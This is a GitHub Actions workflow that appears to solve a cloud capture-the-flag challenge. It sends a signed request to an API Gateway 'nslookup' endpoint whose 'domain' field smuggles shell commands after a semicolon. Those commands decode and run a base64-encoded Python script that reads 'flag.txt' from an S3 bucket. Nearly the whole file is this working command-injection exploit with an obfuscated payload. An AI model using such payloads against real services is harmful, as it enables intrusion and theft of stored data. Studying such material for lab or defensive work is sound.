name: Stage2-Test-Signed-S3-Clear

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Test signed S3 access
        shell: bash
        run: |
          set +e

          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import base64
          import shlex
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth
          from botocore.config import Config

          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          script = r'''
          import time
          import boto3
          from botocore.config import Config

          try:
              client = boto3.client(
                  "s3",
                  region_name="us-east-1",
                  endpoint_url="https://s3.us-east-1.amazonaws.com",
                  config=Config(signature_version="s3v4")
              )

              result = client.get_object(
                  Bucket="userad88e2b168aa387e",
                  Key="flag.txt"
              )

              data = result["Body"].read()

              print("SIGNED_S3_SUCCESS")
              print("BYTES=" + str(len(data)))

              time.sleep(8)

          except Exception as error:
              print("SIGNED_S3_FAILURE")
              print(repr(error))
          '''

          encoded = base64.b64encode(script.encode()).decode()

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          command = (
              "example.com; "
              "printf '%s' "
              + shlex.quote(encoded)
              + " | base64 -d > /tmp/signed_s3.py; "
              + "python3 /tmp/signed_s3.py; #"
          )

          started = time.monotonic()

          response = requests.post(
              API,
              json={"domain": command},
              auth=auth,
              timeout=25
          )

          elapsed = time.monotonic() - started

          print("HTTP=" + str(response.status_code))
          print("ELAPSED=%.2f" % elapsed)
          print(response.text)
          PY
